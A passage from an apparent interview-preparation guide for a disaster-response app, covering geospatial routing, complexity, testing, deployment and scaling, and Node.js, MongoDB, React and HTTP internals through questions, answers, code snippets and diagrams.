       Δφ = math.radians(lat2 - lat1)
       Δλ = math.radians(lon2 - lon1)
       
       # Haversine formula
       a = sin(Δφ/2)² + cos(φ1) · cos(φ2) · sin(Δλ/2)²
       c = 2 · atan2(√a, √(1-a))
       
       return R · c  # Distance in meters
   
   COMPLEXITY: O(1) - fixed number of trig operations
   ACCURACY: ~0.5% for most Earth distances
   USE CASE: Finding nearest emergency station

Q: What's the time complexity of finding the nearest station?
A: Currently O(n) brute force:

   def find_nearest(target, stations):
       min_dist = float('inf')
       nearest = None
       
       for station in stations:  # O(n)
           dist = haversine(target, station)  # O(1)
           if dist < min_dist:
               min_dist = dist
               nearest = station
       
       return nearest
   
   OPTIMIZATION OPTIONS:
   - K-d tree: O(log n) lookup after O(n log n) build
   - MongoDB 2dsphere index: O(log n) with $near
   - Grid-based spatial hashing: O(1) average
   
   CURRENT SCALE: ~10-100 stations per city (O(n) acceptable)

Q: How does OSRM routing work?
A: External service with contraction hierarchies:

   1. WE SEND:
      GET /route/v1/driving/73.85,18.52;73.87,18.54
      // Format: lon1,lat1;lon2,lat2 (reversed!)
   
   2. OSRM RETURNS:
      {
        "routes": [{
          "geometry": {
            "coordinates": [[73.85,18.52], [73.853,18.523], ...]
          },
          "distance": 5230,  // meters
          "duration": 420    // seconds
        }]
      }
   
   3. WE CONVERT:
      // OSRM uses [lon, lat], we use [lat, lon]
      geometry = response.routes[0].geometry.coordinates
        .map(([lon, lat]) => ({ lat, lon }));
   
   COMPLEXITY:
   - OSRM internal: O(log V) per query (contraction hierarchies)
   - Our code: O(p) where p = polyline points
   
   FALLBACK: If OSRM fails, return straight-line route

Q: What are contraction hierarchies (OSRM's algorithm)?
A: Graph preprocessing for fast shortest path queries:

   THE PROBLEM WITH DIJKSTRA:
   - Time complexity: O((V + E) log V)
   - For road networks: V = millions of intersections
   - Each query takes seconds (too slow for real-time)
   
   CONTRACTION HIERARCHIES SOLUTION:
   
   1. PREPROCESSING (done once by OSRM):
      - Order nodes by "importance" (through-traffic)
      - Contract nodes in order:
        a. Remove node v
        b. Add shortcut edges to preserve distances
        c. Repeat for all nodes
      - Result: Hierarchy of shortcuts
   
   2. QUERY (what we use):
      - Bidirectional search (from start and end)
      - Only traverse "upward" in hierarchy
      - Searches meet in the middle
      - Reconstruct path from shortcuts
   
   PERFORMANCE:
   - Preprocessing: Hours for continental maps
   - Query time: O(log V) ≈ milliseconds
   - Space: 2-3x original graph (shortcuts)
   
   WHY USE OSRM API:
   - We don't have resources to preprocess
   - Free public API handles it for us

Q: Explain Big-O complexity with examples from your project?
A: Time and space complexity examples:

   O(1) - CONSTANT TIME:
   // Hash table lookup
   const user = req.session.userId;  // Direct access
   
   // Array access by index
   const first = reports[0];
   
   O(log n) - LOGARITHMIC:
   // MongoDB indexed query
   Report.findById(id);  // B-tree index
   
   // Binary search (conceptual)
   MongoDB.find({ _id: { $gt: someId } }).limit(10);
   
   O(n) - LINEAR:
   // Array filter
   reports.filter(r => r.status === 'Pending');
   
   // Process all items in queue
   for (const report of pendingReports) { ... }
   
   O(n log n) - LINEARITHMIC:
   // Sorting reports by severity
   reports.sort((a, b) => severityOrder[a] - severityOrder[b]);
   
   O(n²) - QUADRATIC (avoid!):
   // Nested loops (don't do this)
   for (const r1 of reports) {
     for (const r2 of reports) {
       // Compare all pairs
     }
   }
   
   SPACE COMPLEXITY EXAMPLES:
   - O(1): Process one report at a time (agents)
   - O(n): Cache all reports in React Query
   - O(n): MongoDB connection pool (fixed size = O(1))

================================================================================
21.10 TESTING & QUALITY QUESTIONS
================================================================================

Q: How would you test this system?
A: Multi-level testing strategy:

   1. UNIT TESTS:
      // Test individual functions
      test('haversine calculates distance correctly', () => {
        const dist = haversine(18.52, 73.85, 18.54, 73.87);
        expect(dist).toBeCloseTo(3200, -2);  // ~3.2km
      });
      
      test('triageSMS parses fire emergency', async () => {
        const result = await triageSMS("Fire at MG Road!");
        expect(result.needType).toBe("Fire");
        expect(result.urgency).toBe("High");
      });
   
   2. INTEGRATION TESTS:
      // Test API endpoints
      test('POST /api/reports creates report', async () => {
        const res = await request(app)
          .post('/api/reports/photo')
          .attach('image', 'test.jpg')
          .field('lat', 18.52);
        expect(res.status).toBe(201);
        expect(res.body.data.reportId).toBeDefined();
      });
   
   3. E2E TESTS (Cypress/Playwright):
      // Test full user flows
      cy.visit('/');
      cy.get('[data-cy=pin-input]').type('0000');
      cy.get('[data-cy=login-btn]').click();
      cy.url().should('include', '/dashboard');
   
   4. AGENT TESTS:
      # Test Sentinel with mock images
      python -m pytest agents/test_sentinel.py

Q: How do you handle testing async code?
A: Multiple approaches for async testing:

   1. ASYNC/AWAIT:
      test('async function returns data', async () => {
        const result = await fetchReports();
        expect(result).toHaveLength(5);
      });
   
   2. MOCK TIMERS (for polling):
      jest.useFakeTimers();
      
      test('agent polls every 3 seconds', () => {
        startAgentPolling();
        
        jest.advanceTimersByTime(3000);
        expect(mockFindReport).toHaveBeenCalledTimes(1);
        
        jest.advanceTimersByTime(3000);
        expect(mockFindReport).toHaveBeenCalledTimes(2);
      });
   
   3. MOCK EXTERNAL SERVICES:
      jest.mock('../services/geminiService');
      
      geminiService.assessSeverity.mockResolvedValue({
        severity: 'High',
        confidence: 0.9
      });
   
   4. SUPERTEST FOR APIs:
      const request = require('supertest');
      const app = require('../server');
      
      test('API returns 401 without auth', async () => {
        const res = await request(app)
          .get('/api/missions')
          .expect(401);
      });

Q: How do you monitor the system?
A: Observability approach:

   1. LOGGING:
      - Winston logger with levels (debug, info, warn, error)
      - Request logging with method, path, status, duration
      - Agent stdout/stderr captured to main console
   
   2. METRICS (would add):
      - Prometheus metrics for request latency, error rates
      - Agent processing times
      - Queue depths (pending reports count)
   
   3. ALERTING (would add):
      - PagerDuty/Slack for high error rates
      - Agent crash notifications
      - Database connection failures

================================================================================
21.11 DEPLOYMENT & SCALABILITY QUESTIONS
================================================================================

Q: How would you deploy this to production?
A: Production deployment strategy:

   1. CONTAINERIZATION:
      # docker-compose.yml
      services:
        backend:
          build: ./backend
          ports: ["5000:5000"]
          environment:
            - NODE_ENV=production
        
        sentinel:
          build: ./agents
          command: python sentinel_agent.py
        
        frontend:
          build: ./frontend
          ports: ["80:80"]
   
   2. ORCHESTRATION:
      - Kubernetes for auto-scaling backend
      - Single instance per agent (prevent duplicate processing)
   
   3. CI/CD:
      # GitHub Actions
      - Run tests on PR
      - Build Docker images on merge
      - Deploy to staging, then production
   
   4. INFRASTRUCTURE:
      - MongoDB Atlas (managed)
      - AWS ECS/GCP Cloud Run for containers
      - CloudFlare CDN for frontend

Q: How would you scale to 10x traffic?
A: Scaling strategy:

   1. BACKEND (Horizontal):
      - Stateless Express servers behind load balancer
      - Sessions in MongoDB (shared across instances)
      - 10 instances can handle 10x requests
   
   2. DATABASE:
      - MongoDB Atlas auto-scaling
      - Read replicas for analytics
      - Sharding if needed
   
   3. AI AGENTS:
      - Still single instance each (atomic locking)
      - But can increase polling frequency
      - Consider message queue (RabbitMQ) for higher throughput
   
   4. CACHING:
      - Redis for API response caching
      - Station list caching (already implemented)
      - Route caching with TTL (already implemented)

Q: Explain horizontal vs vertical scaling?
A: Two approaches to handle more load:

   VERTICAL SCALING (Scale Up):
   - Add more CPU, RAM to existing server
   - Simple: No code changes
   - Limits: Hardware has maximum
   - Example: Upgrade from 4GB to 32GB RAM
   
   HORIZONTAL SCALING (Scale Out):
   - Add more server instances
   - Complex: Need load balancing, stateless design
   - Limits: Virtually unlimited
   - Example: 1 server → 10 servers behind load balancer
   
   OUR DESIGN FOR HORIZONTAL SCALING:
   
   1. STATELESS BACKEND:
      - No data stored in server memory
      - All state in MongoDB
      - Any server can handle any request
   
   2. SESSIONS IN DATABASE:
      - connect-mongo stores sessions in MongoDB
      - User can hit different servers each request
   
   3. FILE UPLOADS EXTERNAL:
      - Images stored in Cloudinary (not local disk)
      - No shared filesystem needed
   
   4. AGENTS ARE SPECIAL:
      - Single instance each (by design)
      - findOneAndUpdate prevents conflicts
      - Could have multiple agents with different filters

Q: What is a load balancer and how does it work?
A: Distributes traffic across multiple servers:

   DIAGRAM:
   
   Internet
      │
      ▼
   ┌─────────────────┐
   │  Load Balancer  │
   │  (Nginx/ALB)    │
   └────────┬────────┘
            │
      ┌─────┼─────┐
      ▼     ▼     ▼
   ┌─────┐┌─────┐┌─────┐
   │Srv 1││Srv 2││Srv 3│
   └─────┘└─────┘└─────┘
            │
            ▼
      ┌──────────┐
      │ MongoDB  │
      └──────────┘
   
   ALGORITHMS:
   
   1. ROUND ROBIN (simple):
      Request 1 → Server 1
      Request 2 → Server 2
      Request 3 → Server 3
      Request 4 → Server 1 (repeat)
   
   2. LEAST CONNECTIONS:
      - Track active connections per server
      - Send to server with fewest connections
      - Better for varying request durations
   
   3. IP HASH (sticky sessions):
      - Hash client IP to determine server
      - Same client always hits same server
      - Useful for non-shared sessions (not us)
   
   HEALTH CHECKS:
   - Load balancer pings /health endpoint
   - Unhealthy servers removed from rotation
   - Automatic failover

================================================================================
21.12 ADVANCED SYSTEM DESIGN QUESTIONS
================================================================================

Q: How would you design this system from scratch?
A: System design interview approach:

   STEP 1: REQUIREMENTS CLARIFICATION
   - Functional: SMS ingestion, image analysis, route optimization
   - Non-functional: 99.9% uptime, <5s processing, offline support
   - Scale: 1000 daily reports, 100 simultaneous users
   
   STEP 2: HIGH-LEVEL DESIGN
   
   ┌────────────┐    ┌────────────┐    ┌────────────┐
   │  Clients   │───▶│  API GW    │───▶│  Services  │
   │(PWA, SMS)  │    │            │    │            │
   └────────────┘    └────────────┘    └────────────┘
                                             │
         ┌──────────────────────────────────┤
         ▼                                  ▼
   ┌────────────┐                    ┌────────────┐
   │  AI Pipeline│                    │  Database  │
   │(Sentinel,  │                    │ (MongoDB)  │
   │ Oracle,    │                    └────────────┘
   │ Logistics) │
   └────────────┘
   
   STEP 3: COMPONENT DEEP DIVE
   
   API GATEWAY:
   - Express.js with middleware
   - Authentication, rate limiting
   - Request routing
   
   AI PIPELINE:
   - Sentinel: Image classification
   - Oracle: Severity assessment
   - Logistics: Route optimization
   - Async processing via polling
   
   DATABASE:
   - MongoDB for flexibility
   - Indexes on status, location
   - TTL for old sessions
   
   STEP 4: SCALING CONSIDERATIONS
   - Horizontal API scaling
   - Database sharding by region
   - CDN for static assets
   
   STEP 5: TRADE-OFFS DISCUSSED
   - Polling vs Message Queue
   - MongoDB vs PostgreSQL
   - Session vs JWT auth

Q: What would you do differently if starting over?
A: Improvements with hindsight:

   1. USE TYPESCRIPT:
      - Type safety catches bugs early
      - Better IDE support
      - Self-documenting code
   
   2. MESSAGE QUEUE FOR AGENTS:
      - RabbitMQ instead of polling
      - Better scalability
      - Guaranteed delivery
   
   3. GRAPHQL FOR FLEXIBLE QUERIES:
      - Single endpoint
      - Clients request exact fields
      - Reduce over-fetching
   
   4. KUBERNETES FROM START:
      - Container orchestration
      - Easy scaling
      - Self-healing
   
   5. OBSERVABILITY FIRST:
      - Prometheus metrics
      - Distributed tracing
      - Centralized logging
   
   WHY WE DIDN'T:
   - Time constraints
   - Learning curve
   - MVP focus
   - Still valid for current scale

Q: How do you ensure data consistency across agents?
A: Consistency mechanisms:

   1. ATOMIC STATUS TRANSITIONS:
      // Only one agent can claim a report
      findOneAndUpdate(
        { status: 'Pending' },
        { $set: { status: 'Processing' } }
      );
   
   2. ORDERED PROCESSING:
      // Agents process in sequence
      Sentinel (image) → Oracle (severity) → Logistics (routing)
      // Each sets status that triggers next
   
   3. IDEMPOTENT OPERATIONS:
      // Processing same report twice = same result
      // No side effects from duplicates
   
   4. EVENTUAL CONSISTENCY ACCEPTANCE:
      // Real-time dashboard may be slightly behind
      // Acceptable for disaster response context
   
   5. CONFLICT RESOLUTION:
      // Last-write-wins for offline sync
      // Acceptable because:
      // - Human verification adds oversight
      // - Most recent data usually correct

Q: How would you add multi-region support?
A: Geographic distribution strategy:

   ARCHITECTURE:
   
   Region A (Mumbai)           Region B (Delhi)
   ┌────────────────┐         ┌────────────────┐
   │  Load Balancer │         │  Load Balancer │
   │       ↓        │         │       ↓        │
   │  API Servers   │         │  API Servers   │
   │       ↓        │         │       ↓        │
   │  MongoDB Node  │◀──────▶│  MongoDB Node  │
   │  (Primary)     │ Replica │  (Secondary)   │
   └────────────────┘         └────────────────┘
          │                          │
          └──────────┬───────────────┘
                     ▼
            ┌────────────────┐
            │  Global DNS    │
            │  (Route 53)    │
            └────────────────┘
   
   IMPLEMENTATION:
   
   1. DATABASE:
      - MongoDB replica set across regions
      - Writes to primary (Mumbai)
      - Reads from nearest secondary
   
   2. ROUTING:
      - GeoDNS routes users to closest region
      - Latency-based routing
   
   3. AGENTS:
      - Region-specific agents
      - Process only local reports
   
   4. CDN:
      - CloudFlare/AWS CloudFront
      - Static assets cached globally
   
   CHALLENGES:
   - Cross-region latency (100-200ms)
   - Conflict resolution for concurrent edits
   - Cost increases significantly

================================================================================
21.13 BEHAVIORAL/SOFT SKILL QUESTIONS
================================================================================

Q: Walk me through a challenging bug you fixed?
A: OSRM coordinate format bug:

   THE BUG:
   - Routes were completely wrong
   - Shortest path going through ocean
   
   INVESTIGATION:
   1. Checked OSRM API response - looked correct
   2. Logged coordinates at each step
   3. Discovered: We used [lat, lng], OSRM uses [lng, lat]
   
   THE FIX:
   // Before (wrong):
   const route = `${start.lat},${start.lng};${end.lat},${end.lng}`;
   
   // After (correct):
   const route = `${start.lng},${start.lat};${end.lng},${end.lat}`;
   
   LESSON LEARNED:
   - Always read API documentation carefully
   - Geographic coordinates have multiple conventions
   - Add unit tests for external integrations

Q: How do you prioritize features in a disaster app?
A: Prioritization framework:

   1. LIFE SAFETY FIRST:
      - Emergency alerting
      - Location tracking
      - Dispatch routing
   
   2. OPERATIONAL EFFICIENCY:
      - AI triage automation
      - Volunteer coordination
      - Analytics dashboard
   
   3. USER EXPERIENCE:
      - Offline support
      - Accessibility
      - Multi-language
   
   4. NICE TO HAVE:
      - Advanced analytics
      - Historical reports
      - Integration APIs
   
   DECISION MATRIX:
   ┌─────────────────┬────────┬────────┐
   │ Feature         │ Impact │ Effort │
   ├─────────────────┼────────┼────────┤
   │ Emergency alert │ High   │ Medium │ ← Do first
   │ Analytics       │ Medium │ High   │ ← Later
   │ Dark mode       │ Low    │ Low    │ ← If time
   └─────────────────┴────────┴────────┘

Q: How did you handle disagreements in the team?
A: Conflict resolution approach:

   EXAMPLE: Polling vs Message Queue debate
   
   MY APPROACH:
   1. LISTEN: Understood colleague's RabbitMQ preference
   2. DATA: Researched both options objectively
   3. PROTOTYPE: Built small POC of each
   4. DECIDE: Team chose polling for simplicity
   5. DOCUMENT: Noted when to switch to queue
   
   OUTCOME:
   - No hard feelings
   - Decision well-documented
   - Clear upgrade path defined
   
   KEY PRINCIPLE:
   "Disagree and commit" - Once decided, support fully

================================================================================
21.14 NODE.JS INTERNALS - DEEP DIVE
================================================================================

Q: Explain the Node.js Event Loop in detail?
A: Heart of Node.js async processing:

   THE EVENT LOOP PHASES (in order):
   
   ┌───────────────────────────────────────────────────────────────┐
   │   ┌───────────────────────────────────────────────────────┐   │
   │   │                    TIMERS                              │   │
   │   │         (setTimeout, setInterval callbacks)           │   │
   │   └───────────────────────┬───────────────────────────────┘   │
   │                           │                                    │
   │   ┌───────────────────────▼───────────────────────────────┐   │
   │   │               PENDING CALLBACKS                        │   │
   │   │       (I/O callbacks deferred from previous loop)      │   │
   │   └───────────────────────┬───────────────────────────────┘   │
   │                           │                                    │
   │   ┌───────────────────────▼───────────────────────────────┐   │
   │   │                 IDLE, PREPARE                          │   │
   │   │                (internal use only)                     │   │
   │   └───────────────────────┬───────────────────────────────┘   │
   │                           │                                    │
   │   ┌───────────────────────▼───────────────────────────────┐   │
   │   │                      POLL                              │   │
   │   │    (retrieve new I/O events; execute I/O callbacks)   │   │
   │   └───────────────────────┬───────────────────────────────┘   │
   │                           │                                    │
   │   ┌───────────────────────▼───────────────────────────────┐   │
   │   │                     CHECK                              │   │
   │   │              (setImmediate callbacks)                  │   │
   │   └───────────────────────┬───────────────────────────────┘   │
   │                           │                                    │
   │   ┌───────────────────────▼───────────────────────────────┐   │
   │   │                CLOSE CALLBACKS                         │   │
   │   │           (e.g., socket.on('close'))                   │   │
   │   └───────────────────────┬───────────────────────────────┘   │
   │                           │                                    │
   │                           └───────────── loops back ──────────►│
   └───────────────────────────────────────────────────────────────┘
   
   MICROTASK QUEUES (processed between phases):
   - process.nextTick() - highest priority
   - Promise.then/catch/finally
   - queueMicrotask()
   
   EXAMPLE ORDER:
   console.log('1');
   
   setTimeout(() => console.log('2'), 0);
   
   Promise.resolve().then(() => console.log('3'));
   
   process.nextTick(() => console.log('4'));
   
   console.log('5');
   
   // Output: 1, 5, 4, 3, 2
   // Explanation:
   // 1, 5 - synchronous (call stack)
   // 4 - nextTick (microtask, highest priority)
   // 3 - Promise (microtask)
   // 2 - setTimeout (timer phase, next loop iteration)

Q: How does Node.js handle blocking operations?
A: Using libuv thread pool:

   SINGLE-THREADED BUT NOT BLOCKING:
   
   Main Thread                    libuv Thread Pool (4 threads default)
   ┌─────────────┐                ┌─────────────┐
   │ Event Loop  │                │  Thread 1   │─── DNS lookup
   │             │◄─────────────►│  Thread 2   │─── File I/O
   │ JavaScript  │  Work Queue   │  Thread 3   │─── Crypto
   │  Execution  │                │  Thread 4   │─── Compression
   └─────────────┘                └─────────────┘
   
   OPERATIONS THAT USE THREAD POOL:
   - fs.readFile, fs.writeFile (file I/O)
   - dns.lookup (DNS resolution)
   - crypto operations (hashing, encryption)
   - zlib (compression/decompression)
   
   OPERATIONS THAT DON'T USE THREAD POOL:
   - Network I/O (handled by OS kernel via epoll/kqueue)
   - Timers
   - Immediate callbacks
   
   INCREASING THREAD POOL:
   process.env.UV_THREADPOOL_SIZE = 8;  // Before any I/O
   // Max: 1024 threads
   
   OUR PROJECT IMPLICATIONS:
   - Image uploads (file I/O) use thread pool
   - MongoDB (network I/O) doesn't block
   - TensorFlow runs in separate Python process

Q: What happens when you make an HTTP request in Node.js?
A: Complete async flow:

   USER CODE:
   const response = await fetch('https://api.example.com/data');
   
   UNDER THE HOOD:
   
   1. JavaScript engine queues async operation
      └► Event loop adds to pending operations
   
   2. libuv delegates to OS (epoll on Linux, kqueue on Mac)
      └► OS handles TCP connection, TLS handshake
   
   3. OS signals completion via callback
      └► libuv adds callback to poll queue
   
   4. Event loop's poll phase executes callback
      └► Data available to JavaScript
   
   5. Promise resolves, await continues
      └► User code resumes execution
   
   NO THREAD BLOCKED during waiting!
   
   CONNECTION FLOW:
   ┌──────────────────────────────────────────────────────────────┐
   │ DNS Resolution (thread pool)                                 │
   │       ↓                                                      │
   │ TCP 3-way handshake (OS kernel)                             │
   │       ↓                                                      │
   │ TLS handshake (OS/OpenSSL)                                  │
   │       ↓                                                      │
   │ HTTP request sent                                            │
   │       ↓                                                      │
   │ Wait for response (no thread blocked!)                       │
   │       ↓                                                      │
   │ Response received → callback → Promise resolved              │
   └──────────────────────────────────────────────────────────────┘

Q: Explain async/await vs callbacks vs Promises?
A: Evolution of async patterns:

   1. CALLBACKS (old way):
   fs.readFile('file.txt', (err, data) => {
     if (err) {
       console.error('Error:', err);
       return;
     }
     fs.readFile('file2.txt', (err2, data2) => {
       if (err2) {
         console.error('Error:', err2);
         return;
       }
       // Callback hell!
     });
   });
   
   PROBLEMS:
   - Nested code (pyramid of doom)
   - Error handling in each callback
   - Hard to follow control flow
   
   2. PROMISES (ES6):
   readFilePromise('file.txt')
     .then(data => readFilePromise('file2.txt'))
     .then(data2 => process(data2))
     .catch(err => console.error('Error:', err));
   
   IMPROVEMENTS:
   - Flat chaining
   - Centralized error handling
   - Composable (.all, .race)
   
   3. ASYNC/AWAIT (ES2017):
   async function readFiles() {
     try {
       const data = await readFilePromise('file.txt');
       const data2 = await readFilePromise('file2.txt');
       return process(data2);
     } catch (err) {
       console.error('Error:', err);
     }
   }
   
   IMPROVEMENTS:
   - Looks synchronous
   - Standard try/catch
   - Easier debugging
   
   OUR PROJECT USES ASYNC/AWAIT:
   - All controllers are async functions
   - All service calls use await
   - Error handling with try/catch

================================================================================
21.15 MONGODB INTERNALS - DEEP DIVE
================================================================================

Q: How does MongoDB store data on disk?
A: WiredTiger storage engine internals:

   STORAGE HIERARCHY:
   
   Database (DisasterResponseDB)
       │
       ├── Collection (reports)
       │       │
       │       ├── Document { _id: ..., ... }
       │       ├── Document { _id: ..., ... }
       │       └── ... 
       │
       ├── Collection (users)
       └── ...
   
   ON DISK:
   /data/db/
       ├── collection-X.wt        # Collection data
       ├── index-Y.wt             # Index data
       ├── WiredTiger              # Metadata
       ├── WiredTiger.lock         # Lock file
       └── journal/                # Write-ahead log
           ├── WiredTigerLog.0000001
           └── ...
   
   DOCUMENT STORAGE (BSON format):
   - Binary JSON (more efficient than JSON)
   - Includes field names in each document
   - Supports additional types (Date, ObjectId, Binary)
   
   BSON EXAMPLE:
   { "name": "John", "age": 30 }
   
   Stored as:
   \x16\x00\x00\x00                   // Document size (22 bytes)
   \x02name\x00\x05\x00\x00\x00John\x00  // String "name": "John"
   \x10age\x00\x1e\x00\x00\x00           // Int32 "age": 30
   \x00                                  // Document terminator

Q: How do MongoDB indexes work?
A: B-tree indexes for fast lookups:

   WITHOUT INDEX (Collection Scan):
   Query: { status: 'Pending' }
   
   ┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐
   │Doc 1│→│Doc 2│→│Doc 3│→│Doc 4│→│Doc 5│→│Doc 6│  
   └─────┘ └─────┘ └─────┘ └─────┘ └─────┘ └─────┘
      ↑       ↑       ↑       ↑       ↑       ↑
    Check   Check   Check   Check   Check   Check
   
   Time: O(n) - must check every document
   
   WITH INDEX (B-tree):
   
               ┌───────────────┐
               │    "New"      │
               │    "Pending"  │
               │    "Resolved" │
               └───────┬───────┘
                       │
         ┌─────────────┼─────────────┐
         ▼             ▼             ▼
    ┌────────┐   ┌──────────┐   ┌──────────┐
    │ "New"  │   │"Pending" │   │"Resolved"│
    │→Doc 2  │   │ →Doc 1   │   │ →Doc 4   │
    │→Doc 5  │   │ →Doc 3   │   │ →Doc 6   │
    └────────┘   └──────────┘   └──────────┘
   
   Time: O(log n) - traverse tree to find entries
   
   OUR INDEXES:
   // Created automatically or explicitly
   reports.createIndex({ status: 1 });         // Status lookups
   reports.createIndex({ createdAt: -1 });     // Recent first
   reports.createIndex({ location: '2dsphere' }); // Geo queries
   
   COMPOUND INDEX:
   // For queries filtering by both fields
   reports.createIndex({ status: 1, createdAt: -1 });
   
   // Efficient for:
   find({ status: 'Pending' }).sort({ createdAt: -1 })

Q: Explain MongoDB transactions and why we don't use them?
A: ACID transactions in MongoDB:

   TRANSACTION EXAMPLE:
   const session = await mongoose.startSession();
   session.startTransaction();
   
   try {
     await Report.updateOne({ _id: id }, { status: 'Dispatched' }, { session });
     await Mission.create([{ reportId: id, ... }], { session });
     
     await session.commitTransaction();
   } catch (error) {
     await session.abortTransaction();
     throw error;
   } finally {
     session.endSession();
   }
   
   WHY WE DON'T USE TRANSACTIONS:
   
   1. SINGLE-DOCUMENT OPERATIONS:
      - Most of our ops are single-document updates
      - MongoDB guarantees atomicity for single docs
      - No transaction needed
   
   2. DESIGN FOR EVENTUAL CONSISTENCY:
      - Agents process independently
      - Status fields coordinate order
      - No strict cross-document consistency needed
   
   3. PERFORMANCE OVERHEAD:
      - Transactions hold locks longer
      - Require replica set (development complexity)
   
   4. IDEMPOTENT DESIGN:
      - Operations can be safely retried
      - findOneAndUpdate is atomic
      - No partial state possible
   
   WHEN TO USE TRANSACTIONS:
   - Bank transfers (debit and credit must both succeed)
   - Inventory systems (reserve and purchase)
   - Not needed for disaster response triage

Q: What is the difference between find() and findOne()?
A: Two ways to query documents:

   find() - Returns a cursor (many documents):
   const cursor = Report.find({ status: 'Pending' });
   
   // Cursor is lazy - doesn't fetch until iteration
   for await (const doc of cursor) {
     console.log(doc);  // Fetched one at a time
   }
   
   // Or fetch all at once
   const all = await Report.find({ status: 'Pending' });  // Array
   
   findOne() - Returns a single document:
   const doc = await Report.findOne({ status: 'Pending' });
   // Returns first matching document or null
   
   PERFORMANCE IMPLICATIONS:
   
   find() without limit:
   - Fetches ALL matching documents
   - Memory: O(n) if converted to array
   - Network: Multiple batches if large result
   
   find().limit(1) vs findOne():
   - Nearly identical performance
   - findOne() slightly more optimized
   - Use findOne() when expecting 0-1 results
   
   OUR USAGE:
   // Agent polling - want exactly one
   Report.findOneAndUpdate({ status: 'Pending' }, ...);
   
   // Dashboard - want all matching
   Report.find({ status: { $ne: 'Resolved' } });

================================================================================
21.16 REACT INTERNALS - DEEP DIVE
================================================================================

Q: Explain React's Virtual DOM and reconciliation?
A: How React efficiently updates the UI:

   THE PROBLEM:
   - Direct DOM manipulation is slow
   - Browsers must recalculate styles, layout, paint
   - Updating 1000 elements = 1000 DOM operations
   
   VIRTUAL DOM SOLUTION:
   
   1. RENDER PHASE (in memory, fast):
      Component renders → Virtual DOM tree created
      
      Virtual DOM (JavaScript objects):
      {
        type: 'div',
        props: { className: 'container' },
        children: [
          { type: 'h1', props: { children: 'Title' } },
          { type: 'p', props: { children: 'Text' } }
        ]
      }
   
   2. DIFFING (comparison):
      Old Virtual DOM vs New Virtual DOM
      - React compares trees
      - Identifies minimal changes needed
      - Uses key prop for list optimization
   
   3. COMMIT PHASE (real DOM updates):
      Only changed elements updated
      
   EXAMPLE:
   // State change: count 0 → 1
   <div>
     <h1>Title</h1>           // Unchanged - no DOM update
     <p>Count: {count}</p>    // Changed - update text node only
   </div>
   
   RECONCILIATION RULES:
   1. Different types → Replace entire subtree
   2. Same type → Update attributes
   3. Lists without keys → Re-render all items
   4. Lists with keys → Move/update efficiently

Q: What are React hooks and how do they work internally?
A: Stateful logic for functional components:

   HOOKS ARE BASED ON:
   - Linked list attached to component fiber
   - Order-dependent (must call in same order)
   - No conditionals around hooks!
   
   useState INTERNALS:
   
   function useState(initialValue) {
     // React maintains a "current hook index"
     const hookIndex = currentHookIndex++;
     
     // First render: initialize state
     if (!fiber.hooks[hookIndex]) {
       fiber.hooks[hookIndex] = {
         state: initialValue,
         queue: []
       };
     }
     
     const hook = fiber.hooks[hookIndex];
     
     // Apply queued updates
     hook.queue.forEach(action => {
       hook.state = typeof action === 'function' 
         ? action(hook.state) 
         : action;
     });
     hook.queue = [];
     
     // setState adds to queue and triggers re-render
     const setState = action => {
       hook.queue.push(action);
       scheduleRerender(fiber);
     };
     
     return [hook.state, setState];
   }
   
   WHY ORDER MATTERS:
   // This breaks!
   if (condition) {
     const [a, setA] = useState(0);  // Hook 0
   }
   const [b, setB] = useState(0);    // Hook 0 or 1???
   
   // React can't track which hook is which!

Q: Explain useEffect lifecycle?
A: Side effects in functional components:

   LIFECYCLE MAPPING:
   
   Class Component          →  Functional Component
   ─────────────────────────────────────────────────
   componentDidMount       →  useEffect(() => {}, [])
   componentDidUpdate      →  useEffect(() => {})
   componentWillUnmount    →  useEffect(() => { return cleanup }, [])
   
   EXECUTION ORDER:
   
   function Component() {
     console.log('1. Render');
     
     useEffect(() => {
       console.log('3. Effect runs');
       return () => console.log('Cleanup');
     }, []);
     
     console.log('2. Before return');
     return <div />;
   }
   
   // Mount: 1, 2, 3
   // Unmount: Cleanup
   
   DEPENDENCY ARRAY EXPLAINED:
   
   useEffect(() => { ... }, []);     // Run once on mount
   useEffect(() => { ... });          // Run every render
   useEffect(() => { ... }, [a, b]);  // Run when a or b changes
   
   OUR PROJECT USAGE:
   
   // Fetch data on mount
   useEffect(() => {
     fetchReports();
   }, []);
   
   // Update when filter changes
   useEffect(() => {
     refetchReports(filter);
   }, [filter]);
   
   // Cleanup subscription
   useEffect(() => {
     const socket = io.connect();
     return () => socket.disconnect();
   }, []);

Q: How does React Query work internally?
A: Server state management with caching:

   REACT QUERY ARCHITECTURE:
   
   ┌─────────────────────────────────────────────────────────────┐
   │                    QueryClient                               │
   │  ┌─────────────────────────────────────────────────────────┐│
   │  │                   Query Cache                            ││
   │  │  ┌───────────────┐ ┌───────────────┐ ┌───────────────┐  ││
   │  │  │ ['reports']   │ │ ['missions']  │ │ ['weather']   │  ││
   │  │  │ data: [...]   │ │ data: [...]   │ │ data: {...}   │  ││
   │  │  │ status: ok    │ │ status: stale │ │ status: ok    │  ││
   │  │  └───────────────┘ └───────────────┘ └───────────────┘  ││
   │  └─────────────────────────────────────────────────────────┘│
   └─────────────────────────────────────────────────────────────┘
   
   QUERY STATES:
   - idle: Not yet run
   - loading: First fetch in progress
   - success: Data available
   - error: Fetch failed
   
   STALE-WHILE-REVALIDATE:
   1. Return cached data immediately (stale)
   2. Fetch fresh data in background
   3. Update cache when fresh data arrives
   4. Re-render with new data
   
   // User sees data instantly, gets update if changed
   const { data } = useQuery(['reports'], fetchReports, {
     staleTime: 30000,      // Consider fresh for 30s
     cacheTime: 5 * 60000,  // Keep in cache for 5 min
   });
   
   CACHE INVALIDATION:
   // After mutation, refetch related queries
   const mutation = useMutation(updateReport, {
     onSuccess: () => {
       queryClient.invalidateQueries(['reports']);
     }
   });

================================================================================
21.17 HTTP & NETWORKING - DEEP DIVE
================================================================================

Q: Explain the complete HTTP request lifecycle?
A: From browser to server and back:

   COMPLETE REQUEST FLOW:
   
   Browser                      Network                     Server
   ──────────────────────────────────────────────────────────────────
   
   1. URL PARSING:
      https://api.example.com:443/reports?status=pending
      │       │              │   │       │
      │       │              │   │       └─ Query string
      │       │              │   └─ Path
      │       │              └─ Port (default 443 for HTTPS)
      │       └─ Hostname
      └─ Protocol
   
   2. DNS RESOLUTION:
      api.example.com → 52.84.231.156
      - Check browser cache
      - Check OS cache
      - Query DNS resolver
      - Query root → TLD → authoritative
   
